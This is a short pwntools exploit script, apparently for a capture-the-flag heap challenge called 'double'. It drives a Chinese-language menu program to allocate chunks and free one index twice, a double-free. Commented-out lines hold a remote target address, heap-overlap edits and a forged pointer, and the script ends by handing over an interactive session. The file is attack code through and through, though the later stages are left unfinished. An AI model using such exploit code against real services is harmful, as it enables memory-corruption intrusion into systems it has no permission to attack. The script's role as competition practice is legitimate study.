from pwn import *
p=process('./double')
# p=remote('59.110.164.72',10021)
# context.log_level='debug'
# gdb.attach(p,'b *0x0000000000400BE5')
# pause()

0x6020E0
0x6024e0

def create(index,size):
    p.recvuntil(str("请选择：").encode())
    p.sendline(b'1')
    p.recvuntil(str('请输入序号：').encode())
    p.sendline(str(index).encode())
    p.recvuntil(str('请输入大小：').encode())
    p.sendline(str(size).encode())
def edit(index,content):
    p.recvuntil(str("请选择：").encode())
    p.sendline(b'4')
    p.recvuntil(str("请输入序号：").encode())
    p.sendline(str(index).encode())
    p.recvuntil(str('请输入编辑内容：').encode())
    p.sendline(str(content).encode())
def del_(index):
    p.recvuntil(str("请选择：").encode())
    p.sendline(b'2')
    p.recvuntil(str("请输入序号：").encode())
    p.sendline(str(index).encode())
def quit_():
    p.recvuntil(str("请选择：").encode())
    p.sendline(b'5')

create(66,0x15CC15CC)
create(3,0x40)
create(4,0x40)
create(6,0x40)
create(5,0x10)
del_(3)
del_(3)
# del_(6)
# del_(3)
# create(0,0x440)
# create(1,0x440)
# create(2,0x440)
# del_(4)

# edit(0,b'm'*(0x390-0x2a0)+p64(0)+p64(0x6024e0))


# create(82,0xCC51CC51)
# quit_()
# create(65,0x15CC15CC)
p.interactive()